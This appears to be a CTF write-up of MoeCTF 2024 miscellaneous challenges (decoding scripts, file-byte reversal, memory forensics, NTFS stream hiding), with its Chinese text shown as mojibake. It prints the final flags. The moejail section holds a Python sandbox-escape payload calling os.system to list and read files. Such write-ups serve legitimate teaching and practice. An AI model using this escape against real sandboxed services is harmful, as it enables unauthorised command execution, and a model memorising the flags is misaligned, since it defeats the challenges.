<p>æ‰«æå¾—åˆ°ä¸€ä¸²ç¥å¿…å†…å®¹ï¼š</p>
<pre tabindex="0"><code>balabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh///key{3FgQG9ZFteHzw7W42}??  
</code></pre><p>{}é‡Œçš„å†…å®¹è§£base58å¾—åˆ°<code>we1rd_qrc0d3</code>ï¼Œä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯key</p>
<p>ç›´æ¥è·‘å»è§£å¯†encode.txtäº†ï¼Œå…‰è§£å¯†è‹±æ–‡å­—ç¬¦éƒ¨åˆ†å°±å‘ç°ç«¯å€ªäº†ï¼Œä¸‰æ®µåˆ†åˆ«å¯¹åº”firstrowï¼Œsecondrowï¼Œthirdrowï¼Œä¸€å…±9ä¸ªæ•°å­—æƒ³ç€è‚¯å®šæ˜¯äºŒç»´ç ç¢ç‰‡çš„æ‹¼æ¥é¡ºåºäº†ï¼Œç›´æ¥æŠŠflagäº¤äº†ï¼Œä¹‹ååˆç ”ç©¶äº†ä¸€ä¸‹ï¼Œå†™äº†ä¸ªè§£å¯†è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self_decoding</span>(output_text):
</span></span><span style="display:flex;"><span>    code_setting_first <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>
</span></span><span style="display:flex;"><span>    output_text <span style="color:#f92672">=</span> output_text<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)
</span></span><span style="display:flex;"><span>    decoded_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>   
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> output_text:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> x <span style="color:#f92672">in</span> code_setting_first:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ord(x) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">116</span>: 
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> ord(x) <span style="color:#f92672">-</span> <span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>                x <span style="color:#f92672">=</span> chr(num)
</span></span><span style="display:flex;"><span>                decoded_text <span style="color:#f92672">+=</span> x
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> ord(x) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">102</span> <span style="color:#f92672">and</span> ord(x) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">96</span>:
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> ord(x) <span style="color:#f92672">+</span> <span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>                x <span style="color:#f92672">=</span> chr(num)
</span></span><span style="display:flex;"><span>                decoded_text <span style="color:#f92672">+=</span> x
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">104</span> <span style="color:#f92672">&lt;=</span> ord(x) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">115</span>:
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> <span style="color:#ae81ff">219</span> <span style="color:#f92672">-</span> ord(x)
</span></span><span style="display:flex;"><span>                x <span style="color:#f92672">=</span> chr(num)
</span></span><span style="display:flex;"><span>                decoded_text <span style="color:#f92672">+=</span> x
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#æ˜æ–‡åŠ å¯†æ—¶å°¾éƒ¨æ•°å­—æ²¡å˜ï¼Œä»å°¾éƒ¨å¼€å§‹å¼‚æˆ–å›å»</span>
</span></span><span style="display:flex;"><span>    number_setting <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789&#34;</span>
</span></span><span style="display:flex;"><span>    n3 <span style="color:#f92672">=</span> output_text[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    n2 <span style="color:#f92672">=</span> str(int(output_text[<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]) <span style="color:#f92672">^</span> int(n3))
</span></span><span style="display:flex;"><span>    n1 <span style="color:#f92672">=</span> str(int(output_text[<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]) <span style="color:#f92672">^</span> int(n2))
</span></span><span style="display:flex;"><span>    decoded_text <span style="color:#f92672">+=</span> n1 <span style="color:#f92672">+</span> n2 <span style="color:#f92672">+</span> n3
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decoded_text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reverse_decoding</span>(input_text):
</span></span><span style="display:flex;"><span>    output_text <span style="color:#f92672">=</span> input_text[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> output_text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    encoded_text1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;7 3 5 d l i a h i r y&#34;</span>
</span></span><span style="display:flex;"><span>    encoded_text2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;6 5 1 d l i w m l v x h&#34;</span>
</span></span><span style="display:flex;"><span>    encoded_text3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;9 1 31 d l i w i r s a&#34;</span>
</span></span><span style="display:flex;"><span>    print(self_decoding(reverse_decoding(encoded_text1)))
</span></span><span style="display:flex;"><span>    print(self_decoding(reverse_decoding(encoded_text2)))
</span></span><span style="display:flex;"><span>    print(self_decoding(reverse_decoding(encoded_text3)))
</span></span></code></pre></div><p>è¿è¡Œç»“æœï¼š</p>
<pre tabindex="0"><code>firstrow147
secondrow236
thirdrow589
</code></pre><p>moectf{we1rd_qrc0d3}</p>
<hr>
<h2 id="the-upside-and-down">The upside and down<a hidden class="anchor" aria-hidden="true" href="#the-upside-and-down">#</a></h2>
<p>æ‹¿åˆ°ä¸€ä¸ª<code>.hex</code>åç¼€çš„æ–‡ä»¶ï¼Œä½†æ˜¯å†…å®¹å’Œintel hexæ–‡ä»¶æ²¡å•¥å…³ç³»ï¼Œç»“åˆé¢˜ç›®åï¼Œè¯•ç€æŠŠæ¯ä¸ªå­—èŠ‚çš„hexå€¼å·¦å³ä¸¤ä½äº¤æ¢é¡ºåºï¼Œè¯•è¯•å‰å‡ ä¸ªå­—èŠ‚å°±èƒ½å‘ç°æ˜¯é€†ç½®çš„pngå°¾ï¼Œäºæ˜¯å°±æƒ³åˆ°æŠŠæ‰€æœ‰å­—èŠ‚éƒ½ååºï¼Œç„¶åå†é€†ç½®æ•´ä¸ªæ–‡ä»¶å³å¯ï¼Œ010Editorå’Œwinhexé‡Œéƒ½æ²¡æ‰¾åˆ°æ–¹ä¾¿ååºå­—èŠ‚çš„å·¥å…·ï¼Œç›´æ¥å†™è„šæœ¬äº†</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;./the_upside_and_down.hex&#34;</span>,<span style="color:#e6db74">&#34;rb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(data)):
</span></span><span style="display:flex;"><span>        hex_num <span style="color:#f92672">=</span> hex(data[i])<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;0x&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span>        hex_num_reverse <span style="color:#f92672">=</span> hex_num[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        reverse_byte <span style="color:#f92672">=</span> chr(int(hex_num_reverse,base<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>))<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;latin&#34;</span>)
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>seek(i)
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(reverse_byte)
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;./the_upside_and_down.hex&#34;</span>,<span style="color:#e6db74">&#34;rb+&#34;</span>) <span style="color:#66d9ef">as</span> ff: 
</span></span><span style="display:flex;"><span>    new_data <span style="color:#f92672">=</span> ff<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flag.png&#34;</span>,<span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> fff:
</span></span><span style="display:flex;"><span>        fff<span style="color:#f92672">.</span>write(new_data[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span></code></pre></div><p>flag.pngæ˜¯ä¸€å¼ äºŒç»´ç ï¼Œæ‰«æå¯ä»¥å¾—åˆ°ï¼š</p>
<pre tabindex="0"><code>where_is_the_flag?
https://balabala_towards:moectf{Fri3nds_d0n&#39;t_lie!}//
</code></pre><hr>
<h2 id="find-it">Find It<a hidden class="anchor" aria-hidden="true" href="#find-it">#</a></h2>
<p>ä¸€é“ç¤¾å·¥é¢˜ï¼Œè´´ä¸ªåŸå›¾å…ˆï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/5.jpg"></p>
<p>å›¾ç‰‡ä¸Šèƒ½çœ‹åˆ°æ¡”å­æ°´æ™¶é…’åº—å’Œç¾å±…é…’åº—ï¼Œå†ç»“åˆæç¤º<code>â€œçš„â€è¿˜æ˜¯â€œçš„â€</code>ï¼Œåœ°å›¾ä¸Šå¤šæœæœï¼Œèƒ½æ‰¾åˆ°å‰çš„å ¡å¹¼å„¿å›­</p>
<p>moectf{ji_di_bao_you_er_yuan}</p>
<hr>
<h2 id="ez_forensics">ez_Forensics<a hidden class="anchor" aria-hidden="true" href="#ez_forensics">#</a></h2>
<p>çœ‹çœ‹cmdè®°å½•å°±è¡Œ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#66d9ef">path</span>&gt;volatility26.exe -f flag.raw --profile=Win7SP1x64 cmdscan
</span></span><span style="display:flex;"><span>Volatility Foundation Volatility Framework 2.6
</span></span><span style="display:flex;"><span>**************************************************
</span></span><span style="display:flex;"><span>CommandProcess: conhost.exe Pid: 2268
</span></span><span style="display:flex;"><span>CommandHistory: 0x32b0a0 Application: cmd.exe Flags: Allocated, Reset
</span></span><span style="display:flex;"><span>CommandCount: 3 LastAdded: 2 LastDisplayed: 2
</span></span><span style="display:flex;"><span>FirstCommand: 0 CommandCountMax: 50
</span></span><span style="display:flex;"><span>ProcessHandle: 0x60
</span></span><span style="display:flex;"><span>Cmd #0 @ 0x330410: echo moectf{WWBGY-TLVC5-XKYBZ} &gt; flag.txt
</span></span><span style="display:flex;"><span>Cmd #1 @ 0x30cec0: echo SJW7O<span style="color:#ae81ff">^%</span>gt8 &gt; flag.txt
</span></span><span style="display:flex;"><span>Cmd #2 @ 0x3350b0: del flag.txt
</span></span><span style="display:flex;"><span>**************************************************
</span></span><span style="display:flex;"><span>CommandProcess: conhost.exe Pid: 904
</span></span><span style="display:flex;"><span>CommandHistory: 0x19b0a0 Application: DumpIt.exe Flags: Allocated
</span></span><span style="display:flex;"><span>CommandCount: 0 LastAdded: -1 LastDisplayed: -1
</span></span><span style="display:flex;"><span>FirstCommand: 0 CommandCountMax: 50
</span></span><span style="display:flex;"><span>ProcessHandle: 0x60
</span></span></code></pre></div><hr>
<h2 id="ctfer2077-1">ctfer2077â‘¡<a hidden class="anchor" aria-hidden="true" href="#ctfer2077-1">#</a></h2>
<p>volumeæ˜¯åŠ å¯†æŒ‚è½½å·ï¼Œå¯†ç æ˜¯é¢˜ç›®æè¿°é‡Œçš„æ ¸å¿ƒä»·å€¼è§‚è§£å¯†å†…å®¹ï¼š</p>
<pre tabindex="0"><code>æ³•æ²»å¯Œå¼ºè‡ªç”±å¯Œå¼ºå’Œè°å¹³ç­‰å’Œè°å¹³ç­‰æ³•æ²»æ³•æ²»å’Œè°å¯Œå¼ºæ³•æ²»æ–‡æ˜å…¬æ­£è‡ªç”±
p@55w0rd
</code></pre><p>VeraCryptæˆåŠŸæŒ‚è½½åèƒ½æ‹¿åˆ°ä¸€ä¸ªflag.txtï¼Œä½†æ˜¯é‡Œé¢æ²¡å†…å®¹ï¼Œè€ƒè™‘åˆ°æ˜¯ä¸ªç£ç›˜ï¼Œæƒ³åˆ°å¯èƒ½æ˜¯NTFSæ•°æ®æµéšå†™ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>A:\<span style="color:#75715e">&gt;dir /r</span>
</span></span><span style="display:flex;"><span> é©±åŠ¨å™¨ A ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚
</span></span><span style="display:flex;"><span> å·çš„åºåˆ—å·æ˜¯ F61A-E148
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> A:\ çš„ç›®å½•
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2024/07/28  20:54                18 flagï¼Ÿ.txt
</span></span><span style="display:flex;"><span>                                 82 flagï¼Ÿ.txt:å°é¹¤.txt:$DATA
</span></span><span style="display:flex;"><span>               1 ä¸ªæ–‡ä»¶             18 å­—èŠ‚
</span></span><span style="display:flex;"><span>               0 ä¸ªç›®å½•      1,064,960 å¯ç”¨å­—èŠ‚
</span></span></code></pre></div><p>notepadæ‰“å¼€ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>A:\<span style="color:#75715e">&gt;notepad flagï¼Ÿ.txt:å°é¹¤.txt</span>
</span></span></code></pre></div><pre tabindex="0"><code>ulpb vfde hfyz yisi buuima
key jqui xxmm vedrhx de qrpb xnxp
ulpb ui veyh dazide
</code></pre><p>ç»“åˆæ–‡ä»¶åå°é¹¤ï¼Œæ‰¾åˆ°ä¸ªå°é¹¤åŒæ‹¼è¾“å…¥æ³•ï¼Œç…§ç€æ‰“å°±èƒ½çŸ¥é“å¤§æ¦‚å†…å®¹äº†ï¼š</p>
<pre tabindex="0"><code>åŒå“ çœŸå¾— å¾ˆæœ‰ æ„æ€ ä¸æ˜¯å—
key å°±æ˜¯ ä¸‹é¢ æŠ˜æ–­è¯ å¾— å…¨å“ ç¬‘äº›
åŒæ‹¼ äº‹ ç€æ · æ‰“å­—å¾—
</code></pre><p>flagæ˜¯ä¸Šé¢è¿™æ®µè¯çš„å…¨æ‹¼å°å†™ï¼š</p>
<p>moectf{shuangpinshizheyangdazide}</p>
<hr>
<h2 id="æ‹¼å›¾ç¾”æ‰‹">æ‹¼å›¾ç¾”æ‰‹<a hidden class="anchor" aria-hidden="true" href="#æ‹¼å›¾ç¾”æ‰‹">#</a></h2>
<p>ç›´æ¥æ‹¼äºŒç»´ç ç¢ç‰‡æ‹¿åˆ°åŠ å¯†çš„flagï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/5.png"></p>
<pre tabindex="0"><code>balabalbalablbalblablbalabala//nihaopintugaoshou//encoded_flag{71517ysd%ryxsc!usv@ucy*wqosy*qxl&amp;sxl*sbys^wb$syqwp$ysyw!qpw@hs}
</code></pre><p>æ ¹æ® <code>encode.py</code> å†™å‡º <code>decode.py</code> æ‹¿åˆ°keyå’Œè§£å¯†åçš„flagï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode <span style="color:#66d9ef">as</span> bd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self_decoding</span>(input_text):
</span></span><span style="display:flex;"><span>    code_setting_first <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>
</span></span><span style="display:flex;"><span>    code_setting_sec <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
</span></span><span style="display:flex;"><span>    number_setting <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789&#34;</span>
</span></span><span style="display:flex;"><span>    decoded_text<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> input_text:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> x <span style="color:#f92672">in</span> code_setting_first:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ord(x) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">123</span> <span style="color:#f92672">and</span> ord(x) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">115</span>:
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> ord(x) <span style="color:#f92672">-</span> <span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> ord(x) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">96</span> <span style="color:#f92672">and</span> ord(x) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">104</span>:
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> ord(x) <span style="color:#f92672">+</span> <span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">104</span> <span style="color:#f92672">&lt;=</span> ord(x) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">115</span>:
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> <span style="color:#ae81ff">219</span> <span style="color:#f92672">-</span> ord(x)
</span></span><span style="display:flex;"><span>            decoded_text <span style="color:#f92672">+=</span> chr(num)      
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> x <span style="color:#f92672">in</span> code_setting_sec:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">&lt;</span> ord(x) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">72</span>:
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> ord(x) <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>  
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">71</span> <span style="color:#f92672">&lt;</span> ord(x) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">79</span>:
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> ord (x) <span style="color:#f92672">-</span> <span style="color:#ae81ff">7</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">78</span> <span style="color:#f92672">&lt;</span> ord(x) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">82</span>:
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> ord(x) <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">87</span> <span style="color:#f92672">&lt;</span> ord(x) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">91</span>:
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> ord(x) <span style="color:#f92672">-</span> <span style="color:#ae81ff">9</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">81</span> <span style="color:#f92672">&lt;</span> ord(x) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">88</span>:
</span></span><span style="display:flex;"><span>                num <span style="color:#f92672">=</span> <span style="color:#ae81ff">168</span> <span style="color:#f92672">-</span> ord(x) 
</span></span><span style="display:flex;"><span>            decoded_text <span style="color:#f92672">+=</span> chr(num)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            decoded_text <span style="color:#f92672">+=</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> decoded_text[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> number_setting:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> decoded_text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    decoded_text <span style="color:#f92672">=</span> list(decoded_text)
</span></span><span style="display:flex;"><span>    tmp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;7&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(input_text)<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>,len(input_text)<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>        decoded_text[i] <span style="color:#f92672">=</span> str(int(input_text[i]) <span style="color:#f92672">^</span> int(tmp))
</span></span><span style="display:flex;"><span>        tmp <span style="color:#f92672">=</span> decoded_text[i]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(decoded_text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reverse_decoding</span>(input_text):
</span></span><span style="display:flex;"><span>    output_text <span style="color:#f92672">=</span> input_text[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> output_text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">strange_character_hint</span>(key):
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> reverse_decoding(self_decoding(key))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    cipherkey <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;eGl4c2R4bmxVbVhpeHVuYkdzYXJkZnRhVWl4YXZ0aXRzSnh6bXRpYVU=&#39;</span>
</span></span><span style="display:flex;"><span>    print(strange_character_hint(bd(cipherkey)<span style="color:#f92672">.</span>decode()))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;71517ysd</span><span style="color:#e6db74">%r</span><span style="color:#e6db74">yxsc!usv@ucy*wqosy*qxl&amp;sxl*sbys^wb$syqwp$ysyw!qpw@hs&#34;</span>
</span></span><span style="display:flex;"><span>    print(self_decoding(reverse_decoding(ciphertext)))
</span></span></code></pre></div><p>è¿è¡Œç»“æœï¼š</p>
<pre tabindex="0"><code>StrangeCharacterStaywithNumberOnSomewhere
hs@dkj!dfhf$kdjfh$ud^hfuh*oeh&amp;oej*fhljd*fvb@chb!vhefi%whf52367
</code></pre><p>hintçš„æ„æ€å¯èƒ½æ˜¯è¯´flagä¸­@è¿™ç§å­—ç¬¦åº”è¯¥å¯¹åº”é”®ç›˜ä¸Šçš„æ•°å­—ï¼š</p>
<pre tabindex="0"><code>hs2dkj1dfhf4kdjfh4ud6hfuh8oeh7oej8fhljd8fvb2chb1vhefi5whf52367
</code></pre><p>å”‰ï¼Œå¯¹ç€è¿™ä¸²å­—ç¬¦æƒ³äº†å¥½ä¹…å¥½ä¹…å¥½ä¹…ï¼Œæœ€åå‘ç°flagæ˜¯è¿™æ®µä¸œè¥¿åŒ…ä¸Šmoectf{}</p>
<hr>
<h2 id="moejail_lv2">moejail_lv2<a hidden class="anchor" aria-hidden="true" href="#moejail_lv2">#</a></h2>
<p>æ„Ÿè§‰å’Œlv1æ²¡å•¥åŒºåˆ«ï¼Œè¯´æ˜¯è¿‡æ»¤äº†å­—ç¬¦ï¼Œç›´æ¥cat flagæ–‡ä»¶äº†ä¹Ÿæ²¡æµ‹ï¼ˆ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Give me your code: __import__<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;os&#39;</span><span style="color:#f92672">)</span>.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;ls -al /tmp&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span>drwxrwxrwt    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">26</span> 11:11 .
</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">26</span> 11:11 ..
</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> root     root            <span style="color:#ae81ff">57</span> Aug <span style="color:#ae81ff">26</span> 11:11 therealflag_35173e1253a15fb3d5d15efdc930eb8e
</span></span><span style="display:flex;"><span>Nope
</span></span><span style="display:flex;"><span>é¦ƒãˆ Are you robot? Please enter <span style="color:#e6db74">&#39;FMMG8H&#39;</span>+<span style="color:#e6db74">&#39;F9BUG2&#39;</span><span style="color:#f92672">=</span>? to <span style="color:#66d9ef">continue</span>: FMMG8HF9BUG2
</span></span><span style="display:flex;"><span>Give me your code: __import__<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;os&#39;</span><span style="color:#f92672">)</span>.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /tmp/therealflag_35*&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>moectf<span style="color:#f92672">{</span>yOu-caN-BYPa5S-THe_Str1NG_fIITEr-6Y_NUm_t0-ChR30<span style="color:#f92672">}</span>
</span></span></code></pre></div><hr>
<h2 id="æˆ‘çš„å›¾å±‚åœ¨ä½ ä¹‹ä¸Š">æˆ‘çš„å›¾å±‚åœ¨ä½ ä¹‹ä¸Š<a hidden class="anchor" aria-hidden="true" href="#æˆ‘çš„å›¾å±‚åœ¨ä½ ä¹‹ä¸Š">#</a></h2>
<p>æ–‡ä»¶å°¾æœ‰ä¸ªç½‘å€ï¼Œæ‰“å¼€åˆ†ç¦»å›¾å±‚ï¼Œé»‘çš„é‚£å±‚å›¾ç‰‡å¯¼å‡ºåï¼Œstegsolveé‡Œç¿»ç¿»å¯ä»¥çœ‹åˆ° <code>key=p_w_d</code></p>
<p>ç”¨è¿™ä¸ªkeyè§£å‹ç¼©åŒ…ï¼Œä¹‹åè§£å‡¯æ’’å°±è¡Œ</p>
<pre tabindex="0"><code>zbrpgs{q751894o-rr0n-47qq-85q4-r92q0443921s}

moectf{d751894b-ee0a-47dd-85d4-e92d0443921f}
</code></pre><hr>
<h2 id="æ—¶å…‰ç©¿æ¢­æœº">æ—¶å…‰ç©¿æ¢­æœº<a hidden class="anchor" aria-hidden="true" href="#æ—¶å…‰ç©¿æ¢­æœº">#</a></h2>
<p><code>1946å¹´4æœˆ20æ—¥çš„ä¼¦æ•¦</code> + <code>å½“åœ°çŸ¥åçš„ç”»æŠ¥</code>  ==&gt;  <code>Illustrated London News</code>ï¼š</p>
<p><img loading="lazy" src="/images/MoeCTF2024/MISC/6.png"></p>
<p>åœ¨è¿™ä¸ªnewsé‡Œé¢ç­›é€‰æ—¶é—´ <code>1946/4/20</code> + <code>tomb</code> ï¼Œèƒ½æ‰¾åˆ°ä¸€ç¯‡é‡åˆåº¦æé«˜çš„ç”»æŠ¥ï¼š</p>
